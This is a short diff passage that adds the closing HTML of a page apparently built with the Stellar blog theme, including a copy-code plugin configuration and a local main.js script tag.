+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied","toast":"复制成功"});
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.26.4" async></script>
+
+<!-- optional -->
+
+
+
+
+
+
+<!-- inject -->
+
+</div></body></html>
